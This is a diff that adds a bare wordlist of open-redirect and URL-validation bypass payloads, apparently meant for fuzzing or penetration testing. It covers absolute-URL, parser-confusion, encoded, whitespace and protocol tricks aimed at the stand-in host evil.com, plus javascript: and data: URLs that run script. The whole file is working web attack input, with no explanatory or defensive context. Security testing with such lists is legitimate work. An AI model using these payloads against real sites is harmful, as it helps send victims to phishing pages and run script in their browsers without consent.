@@ -1,0 +1,45 @@
+# Open redirect payloads
+
+# --- Absolute URLs ---
+https://evil.com
+http://evil.com
+//evil.com
+//evil.com/
+\\evil.com
+\\\\evil.com
+//google.com@evil.com
+https://trusted.com.evil.com
+https://evil.com?trusted.com
+https://evil.com/trusted.com
+
+# --- Parser confusion ---
+http://trusted.com#@evil.com/
+http://trusted.com@evil.com/
+http://trusted.com%00@evil.com
+//trusted.com@evil.com
+https://evil.com/%2F..
+/\evil.com
+/%0a/evil.com
+/%00/evil.com
+/%09/evil.com
+/%2f%2fevil.com
+/%252f%252fevil.com
+/.evil.com
+;@evil.com
+
+# --- Protocol confusion ---
+javascript:alert(1)
+javascript://trusted.com/%0aalert(1)
+data:text/html,<script>alert(1)</script>
+
+# --- Encoded ---
+%2F%2Fevil.com
+%2F%2F%2Fevil.com
+%5C%5Cevil.com
+/%2e%2e/%2e%2e/evil.com
+
+# --- Null/whitespace ---
+/\/\evil.com
+//evil.com/
+evil.com/
+.evil.com
